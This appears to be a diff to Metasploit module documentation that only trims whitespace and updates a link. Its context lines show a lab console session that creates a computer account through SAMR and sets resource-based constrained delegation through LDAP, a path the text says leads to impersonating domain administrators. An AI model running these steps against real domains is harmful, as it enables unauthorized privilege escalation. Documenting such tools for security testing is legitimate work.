@@ -49,7 +49,7 @@ The new computer account can then impersonate any user, including domain adminis
 with the Service for User (S4U) Kerberos extension.
 
 ```
-msf6 auxiliary(admin/dcerpc/samr_computer) > show options 
+msf6 auxiliary(admin/dcerpc/samr_computer) > show options
 
 Module options (auxiliary/admin/dcerpc/samr_computer):
 
@@ -57,7 +57,7 @@ Module options (auxiliary/admin/dcerpc/samr_computer):
    ----               ---------------  --------  -----------
    COMPUTER_NAME                       no        The computer name
    COMPUTER_PASSWORD                   no        The password for the new computer
-   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT              445              yes       The target port (TCP)
    SMBDomain          .                no        The Windows domain to use for authentication
    SMBPass                             no        The password for the specified username
@@ -85,7 +85,7 @@ msf6 auxiliary(admin/dcerpc/samr_computer) > run
 [+] 192.168.159.10:445 -   Password: A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT
 [+] 192.168.159.10:445 -   SID:      S-1-5-21-3402587289-1488798532-3618296993-1655
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/samr_computer) > use auxiliary/admin/ldap/rbcd 
+msf6 auxiliary(admin/dcerpc/samr_computer) > use auxiliary/admin/ldap/rbcd
 msf6 auxiliary(admin/ldap/rbcd) > set BIND_DN sandy@msflab.local
 BIND_DN => sandy@msflab.local
 msf6 auxiliary(admin/ldap/rbcd) > set BIND_PW Password1!
@@ -121,5 +121,5 @@ msf6 auxiliary(admin/ldap/rbcd) > read
 [*] Allowed accounts:
 [*]   DESKTOP-QLSTR9NW$ (S-1-5-21-3402587289-1488798532-3618296993-1655)
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/rbcd) > 
+msf6 auxiliary(admin/ldap/rbcd) >
 ```
